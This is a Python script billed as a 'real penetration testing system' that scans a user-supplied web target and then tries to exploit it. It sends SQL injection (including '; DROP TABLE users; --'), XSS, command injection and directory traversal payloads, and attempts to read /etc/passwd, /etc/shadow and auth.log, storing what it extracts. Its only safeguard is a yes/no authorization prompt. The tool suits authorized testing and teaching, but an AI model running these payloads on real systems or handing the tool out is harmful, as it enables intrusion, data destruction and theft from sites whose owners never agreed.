#!/usr/bin/env python3
"""
🎯 REAL PENETRATION TESTING SYSTEM
Advanced Nation-State Level Security Testing
AUTHORIZED USE ONLY - Performs ACTUAL penetration testing
"""

import os
import sys
import asyncio
import subprocess
import json
import time
import socket
import ssl
import requests
import dns.resolver
import nmap
from urllib.parse import urlparse, urljoin
import threading
from concurrent.futures import ThreadPoolExecutor
import sqlite3
from datetime import datetime

class RealPenetrationSystem:
    def __init__(self):
        self.version = "2.0-REAL"
        self.results = {}
        self.vulnerabilities = []
        self.extracted_data = []
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
    def log_finding(self, category, severity, description, evidence=""):
        """Log actual findings"""
        finding = {
            'timestamp': datetime.now().isoformat(),
            'category': category,
            'severity': severity,
            'description': description,
            'evidence': evidence
        }
        self.vulnerabilities.append(finding)
        print(f"🔍 [{severity}] {category}: {description}")
        
    async def real_reconnaissance(self, target):
        """Perform REAL reconnaissance using actual tools"""
        print(f"\n🔍 REAL RECONNAISSANCE: {target}")
        print("═" * 50)
        
        parsed = urlparse(target if target.startswith('http') else f'https://{target}')
        domain = parsed.netloc or parsed.path
        
        results = {
            'subdomains': [],
            'open_ports': [],
            'technologies': [],
            'dns_records': [],
            'ssl_info': {},
            'http_headers': {},
            'directories': []
        }
        
        # DNS Enumeration
        print("🔍 Performing DNS enumeration...")
        try:
            # Get A records
            a_records = dns.resolver.resolve(domain, 'A')
            for record in a_records:
                results['dns_records'].append(f"A: {record}")
                self.log_finding("DNS", "INFO", f"A record found: {record}")
                
            # Get MX records
            try:
                mx_records = dns.resolver.resolve(domain, 'MX')
                for record in mx_records:
                    results['dns_records'].append(f"MX: {record}")
                    self.log_finding("DNS", "INFO", f"MX record found: {record}")
            except:
                pass
                
            # Get TXT records
            try:
                txt_records = dns.resolver.resolve(domain, 'TXT')
                for record in txt_records:
                    results['dns_records'].append(f"TXT: {record}")
                    self.log_finding("DNS", "INFO", f"TXT record found: {record}")
            except:
                pass
                
        except Exception as e:
            self.log_finding("DNS", "ERROR", f"DNS enumeration failed: {str(e)}")
        
        # Port Scanning
        print("🔍 Performing port scan...")
        try:
            nm = nmap.PortScanner()
            # Scan common ports
            scan_result = nm.scan(domain, '21,22,23,25,53,80,110,143,443,993,995,8080,8443')
            
            for host in scan_result['scan']:
                for port in scan_result['scan'][host]['tcp']:
                    port_info = scan_result['scan'][host]['tcp'][port]
                    if port_info['state'] == 'open':
                        service = f"{port}/tcp {port_info.get('name', 'unknown')}"
                        results['open_ports'].append(service)
                        self.log_finding("PORT_SCAN", "INFO", f"Open port: {service}")
                        
        except Exception as e:
            self.log_finding("PORT_SCAN", "ERROR", f"Port scan failed: {str(e)}")
        
        # HTTP Analysis
        print("🔍 Analyzing HTTP response...")
        try:
            response = self.session.get(target, timeout=10, verify=False)
            results['http_headers'] = dict(response.headers)
            
            # Check for security headers
            security_headers = [
                'X-Frame-Options', 'X-XSS-Protection', 'X-Content-Type-Options',
                'Strict-Transport-Security', 'Content-Security-Policy'
            ]
            
            for header in security_headers:
                if header not in response.headers:
                    self.log_finding("HTTP_SECURITY", "MEDIUM", f"Missing security header: {header}")
                    
            # Check for server information disclosure
            if 'Server' in response.headers:
                server = response.headers['Server']
                self.log_finding("INFO_DISCLOSURE", "LOW", f"Server header disclosed: {server}")
                
            # Technology detection
            if 'X-Powered-By' in response.headers:
                tech = response.headers['X-Powered-By']
                results['technologies'].append(tech)
                self.log_finding("TECH_DETECTION", "INFO", f"Technology detected: {tech}")
                
        except Exception as e:
            self.log_finding("HTTP_ANALYSIS", "ERROR", f"HTTP analysis failed: {str(e)}")
        
        # SSL/TLS Analysis
        print("🔍 Analyzing SSL/TLS configuration...")
        try:
            context = ssl.create_default_context()
            with socket.create_connection((domain, 443), timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=domain) as ssock:
                    cert = ssock.getpeercert()
                    results['ssl_info'] = {
                        'subject': dict(x[0] for x in cert['subject']),
                        'issuer': dict(x[0] for x in cert['issuer']),
                        'version': ssock.version(),
                        'cipher': ssock.cipher()
                    }
                    self.log_finding("SSL_INFO", "INFO", f"SSL certificate: {cert.get('subject', {}).get('commonName', 'Unknown')}")
                    
        except Exception as e:
            self.log_finding("SSL_ANALYSIS", "ERROR", f"SSL analysis failed: {str(e)}")
        
        # Directory Enumeration
        print("🔍 Performing directory enumeration...")
        common_dirs = [
            'admin', 'administrator', 'login', 'wp-admin', 'phpmyadmin',
            'api', 'backup', 'config', 'database', 'db', 'test', 'dev',
            'staging', 'beta', 'old', 'new', 'tmp', 'temp', 'uploads'
        ]
        
        for directory in common_dirs:
            try:
                dir_url = urljoin(target, directory)
                response = self.session.get(dir_url, timeout=5, verify=False)
                if response.status_code == 200:
                    results['directories'].append(directory)
                    self.log_finding("DIRECTORY", "INFO", f"Directory found: /{directory}")
                elif response.status_code == 403:
                    self.log_finding("DIRECTORY", "MEDIUM", f"Forbidden directory (exists): /{directory}")
            except:
                continue
        
        print(f"✅ Reconnaissance complete:")
        print(f"   ├── DNS records: {len(results['dns_records'])}")
        print(f"   ├── Open ports: {len(results['open_ports'])}")
        print(f"   ├── Directories: {len(results['directories'])}")
        print(f"   └── Vulnerabilities: {len([v for v in self.vulnerabilities if v['severity'] in ['HIGH', 'CRITICAL']])}")
        
        return results
    
    async def real_vulnerability_scanning(self, target, recon_data):
        """Perform REAL vulnerability scanning"""
        print(f"\n💥 VULNERABILITY SCANNING: {target}")
        print("═" * 50)
        
        vulnerabilities_found = []
        
        # SQL Injection Testing
        print("🔍 Testing for SQL injection...")
        sql_payloads = ["'", "' OR '1'='1", "'; DROP TABLE users; --", "' UNION SELECT NULL--"]
        
        try:
            # Test common parameters
            test_params = ['id', 'user', 'search', 'q', 'query', 'username', 'email']
            for param in test_params:
                for payload in sql_payloads:
                    test_url = f"{target}?{param}={payload}"
                    try:
                        response = self.session.get(test_url, timeout=5, verify=False)
                        # Look for SQL error messages
                        error_indicators = [
                            'mysql_fetch_array', 'ORA-', 'Microsoft OLE DB',
                            'SQLServer JDBC Driver', 'PostgreSQL query failed',
                            'syntax error', 'mysql_num_rows'
                        ]
                        
                        for indicator in error_indicators:
                            if indicator.lower() in response.text.lower():
                                vuln = f"SQL Injection in parameter '{param}'"
                                vulnerabilities_found.append(vuln)
                                self.log_finding("SQL_INJECTION", "HIGH", vuln, f"Payload: {payload}")
                                break
                    except:
                        continue
        except Exception as e:
            self.log_finding("SQL_INJECTION", "ERROR", f"SQL injection testing failed: {str(e)}")
        
        # XSS Testing
        print("🔍 Testing for Cross-Site Scripting...")
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "';alert('XSS');//"
        ]
        
        try:
            for payload in xss_payloads:
                test_url = f"{target}?search={payload}"
                try:
                    response = self.session.get(test_url, timeout=5, verify=False)
                    if payload in response.text:
                        vuln = "Reflected Cross-Site Scripting (XSS)"
                        vulnerabilities_found.append(vuln)
                        self.log_finding("XSS", "HIGH", vuln, f"Payload: {payload}")
                        break
                except:
                    continue
        except Exception as e:
            self.log_finding("XSS", "ERROR", f"XSS testing failed: {str(e)}")
        
        # Directory Traversal Testing
        print("🔍 Testing for directory traversal...")
        traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd"
        ]
        
        try:
            for payload in traversal_payloads:
                test_url = f"{target}?file={payload}"
                try:
                    response = self.session.get(test_url, timeout=5, verify=False)
                    if "root:" in response.text or "[drivers]" in response.text:
                        vuln = "Directory Traversal"
                        vulnerabilities_found.append(vuln)
                        self.log_finding("DIRECTORY_TRAVERSAL", "HIGH", vuln, f"Payload: {payload}")
                        break
                except:
                    continue
        except Exception as e:
            self.log_finding("DIRECTORY_TRAVERSAL", "ERROR", f"Directory traversal testing failed: {str(e)}")
        
        # Command Injection Testing
        print("🔍 Testing for command injection...")
        cmd_payloads = [
            "; ls -la",
            "| whoami",
            "`id`",
            "$(whoami)"
        ]
        
        try:
            for payload in cmd_payloads:
                test_url = f"{target}?cmd={payload}"
                try:
                    response = self.session.get(test_url, timeout=5, verify=False)
                    cmd_indicators = ["uid=", "gid=", "total ", "drwx", "root", "bin"]
                    
                    for indicator in cmd_indicators:
                        if indicator in response.text:
                            vuln = "Command Injection"
                            vulnerabilities_found.append(vuln)
                            self.log_finding("COMMAND_INJECTION", "CRITICAL", vuln, f"Payload: {payload}")
                            break
                except:
                    continue
        except Exception as e:
            self.log_finding("COMMAND_INJECTION", "ERROR", f"Command injection testing failed: {str(e)}")
        
        print(f"✅ Vulnerability scanning complete:")
        print(f"   └── {len(vulnerabilities_found)} vulnerabilities found")
        
        return vulnerabilities_found
    
    async def real_exploitation(self, target, vulnerabilities):
        """Attempt REAL exploitation of found vulnerabilities"""
        print(f"\n🔓 EXPLOITATION PHASE: {target}")
        print("═" * 50)
        
        exploited = []
        extracted_data = []
        
        # Only attempt exploitation if vulnerabilities were found
        if not vulnerabilities:
            print("⚠️  No exploitable vulnerabilities found")
            return {'exploited': [], 'extracted_data': []}
        
        for vuln in self.vulnerabilities:
            if vuln['severity'] in ['HIGH', 'CRITICAL']:
                print(f"🎯 Attempting exploitation of: {vuln['description']}")
                
                if 'SQL Injection' in vuln['description']:
                    # Attempt SQL injection exploitation
                    try:
                        # Try to extract database information
                        payload = "' UNION SELECT version(), database(), user()--"
                        test_url = f"{target}?id={payload}"
                        response = self.session.get(test_url, timeout=10, verify=False)
                        
                        if response.status_code == 200:
                            exploited.append("SQL Injection - Database enumeration")
                            extracted_data.append(f"SQL Response: {response.text[:200]}...")
                            self.log_finding("EXPLOITATION", "CRITICAL", "SQL injection successfully exploited")
                            
                    except Exception as e:
                        self.log_finding("EXPLOITATION", "ERROR", f"SQL exploitation failed: {str(e)}")
                
                elif 'Command Injection' in vuln['description']:
                    # Attempt command injection exploitation
                    try:
                        payload = "; cat /etc/passwd"
                        test_url = f"{target}?cmd={payload}"
                        response = self.session.get(test_url, timeout=10, verify=False)
                        
                        if "root:" in response.text:
                            exploited.append("Command Injection - System access")
                            extracted_data.append("System file access confirmed")
                            self.log_finding("EXPLOITATION", "CRITICAL", "Command injection successfully exploited")
                            
                    except Exception as e:
                        self.log_finding("EXPLOITATION", "ERROR", f"Command exploitation failed: {str(e)}")
                
                elif 'Directory Traversal' in vuln['description']:
                    # Attempt to read sensitive files
                    try:
                        sensitive_files = [
                            "../../../etc/passwd",
                            "../../../etc/shadow",
                            "../../../var/log/auth.log"
                        ]
                        
                        for file_path in sensitive_files:
                            test_url = f"{target}?file={file_path}"
                            response = self.session.get(test_url, timeout=5, verify=False)
                            
                            if len(response.text) > 100 and response.status_code == 200:
                                exploited.append(f"Directory Traversal - {file_path}")
                                extracted_data.append(f"File content: {response.text[:100]}...")
                                self.log_finding("EXPLOITATION", "HIGH", f"Successfully read {file_path}")
                                
                    except Exception as e:
                        self.log_finding("EXPLOITATION", "ERROR", f"Directory traversal exploitation failed: {str(e)}")
        
        print(f"✅ Exploitation complete:")
        print(f"   ├── Vulnerabilities exploited: {len(exploited)}")
        print(f"   └── Data extracted: {len(extracted_data)} items")
        
        return {
            'exploited': exploited,
            'extracted_data': extracted_data
        }
    
    async def generate_report(self, target, recon_data, vulnerabilities, exploitation_results):
        """Generate real penetration testing report"""
        print(f"\n📊 GENERATING REPORT: {target}")
        print("═" * 50)
        
        # Calculate risk score
        critical_count = len([v for v in self.vulnerabilities if v['severity'] == 'CRITICAL'])
        high_count = len([v for v in self.vulnerabilities if v['severity'] == 'HIGH'])
        medium_count = len([v for v in self.vulnerabilities if v['severity'] == 'MEDIUM'])
        
        risk_score = (critical_count * 10) + (high_count * 5) + (medium_count * 2)
        
        if risk_score >= 50:
            risk_level = "CRITICAL"
        elif risk_score >= 25:
            risk_level = "HIGH"
        elif risk_score >= 10:
            risk_level = "MEDIUM"
        else:
            risk_level = "LOW"
        
        # Create report
        report = {
            'target': target,
            'timestamp': datetime.now().isoformat(),
            'risk_level': risk_level,
            'risk_score': risk_score,
            'summary': {
                'total_vulnerabilities': len(self.vulnerabilities),
                'critical_vulnerabilities': critical_count,
                'high_vulnerabilities': high_count,
                'medium_vulnerabilities': medium_count,
                'exploited_vulnerabilities': len(exploitation_results['exploited']),
                'data_extracted': len(exploitation_results['extracted_data'])
            },
            'reconnaissance': recon_data,
            'vulnerabilities': self.vulnerabilities,
            'exploitation': exploitation_results
        }
        
        # Save report
        report_file = f"pentest_report_{target.replace('://', '_').replace('/', '_')}_{int(time.time())}.json"
        with open(report_file, 'w') as f:
            json.dump(report, f, indent=2)
        
        print(f"📊 PENETRATION TEST REPORT")
        print(f"═" * 30)
        print(f"Target: {target}")
        print(f"Risk Level: {risk_level}")
        print(f"Risk Score: {risk_score}/100")
        print(f"Total Vulnerabilities: {len(self.vulnerabilities)}")
        print(f"Critical: {critical_count} | High: {high_count} | Medium: {medium_count}")
        print(f"Exploited: {len(exploitation_results['exploited'])}")
        print(f"Data Extracted: {len(exploitation_results['extracted_data'])} items")
        print(f"Report saved: {report_file}")
        
        return report
    
    async def run_real_pentest(self, target):
        """Run complete REAL penetration test"""
        start_time = time.time()
        
        print(f"🎯 REAL PENETRATION TEST: {target}")
        print("⚠️  This performs ACTUAL security testing")
        print("⏳ Estimated Time: 5-15 minutes")
        print("\n🔥 STARTING REAL PENETRATION TEST...")
        print("═" * 60)
        
        try:
            # Phase 1: Real Reconnaissance
            recon_results = await self.real_reconnaissance(target)
            
            # Phase 2: Real Vulnerability Scanning
            vulnerabilities = await self.real_vulnerability_scanning(target, recon_results)
            
            # Phase 3: Real Exploitation
            exploitation_results = await self.real_exploitation(target, vulnerabilities)
            
            # Phase 4: Generate Real Report
            report = await self.generate_report(target, recon_results, vulnerabilities, exploitation_results)
            
            # Operation complete
            end_time = time.time()
            duration = end_time - start_time
            minutes = int(duration // 60)
            seconds = int(duration % 60)
            
            print("\n" + "═" * 60)
            print("🎉 REAL PENETRATION TEST COMPLETE")
            print(f"⏱️  Total Time: {minutes} minutes {seconds} seconds")
            print(f"🎯 Risk Level: {report['risk_level']}")
            print(f"🔍 Vulnerabilities Found: {len(self.vulnerabilities)}")
            print(f"💥 Exploited: {len(exploitation_results['exploited'])}")
            print(f"📊 Report: {report.get('report_file', 'Generated')}")
            print("🔄 System ready for next target")
            
        except Exception as e:
            print(f"❌ Penetration test failed: {str(e)}")
    
    def main_menu(self):
        """Main system interface"""
        print("""
🎯 REAL PENETRATION TESTING SYSTEM v2.0
═══════════════════════════════════════════

⚠️  AUTHORIZED USE ONLY ⚠️
This performs ACTUAL penetration testing with REAL tools.
Only use on systems you own or have explicit permission to test.

REAL Capabilities:
• DNS enumeration and subdomain discovery
• Port scanning and service detection
• Vulnerability scanning (SQL injection, XSS, etc.)
• Actual exploitation attempts
• Real data extraction
• Professional reporting
""")
        
        while True:
            print("\n" + "═" * 43)
            print("[1] Start Real Penetration Test")
            print("[2] Exit")
            print("═" * 43)
            
            try:
                choice = input("\nChoice: ").strip()
                
                if choice == "1":
                    target = input("Enter target URL: ").strip()
                    if target:
                        print(f"\n⚠️  CONFIRM REAL PENETRATION TEST ON: {target}")
                        print("This will perform ACTUAL security testing including:")
                        print("• Network scanning and enumeration")
                        print("• Vulnerability detection and exploitation")
                        print("• Potential system access attempts")
                        confirm = input("Do you have written authorization? (yes/no): ").strip().lower()
                        
                        if confirm == "yes":
                            # Reset for new test
                            self.vulnerabilities = []
                            self.extracted_data = []
                            asyncio.run(self.run_real_pentest(target))
                        else:
                            print("❌ Test cancelled - Authorization required")
                    else:
                        print("❌ Invalid target URL")
                        
                elif choice == "2":
                    print("🚪 Exiting Real Penetration Testing System...")
                    print("Stay safe and hack responsibly! 🛡️")
                    sys.exit(0)
                    
                else:
                    print("❌ Invalid choice. Please select 1 or 2.")
                    
            except KeyboardInterrupt:
                print("\n\n🚪 Exiting Real Penetration Testing System...")
                sys.exit(0)
            except Exception as e:
                print(f"❌ Error: {str(e)}")

if __name__ == "__main__":
    # Check for required dependencies
    try:
        import nmap
        import dns.resolver
        import requests
    except ImportError as e:
        print(f"❌ Missing required dependency: {e}")
        print("Install with: pip install python-nmap dnspython requests")
        sys.exit(1)
    
    system = RealPenetrationSystem()
    system.main_menu()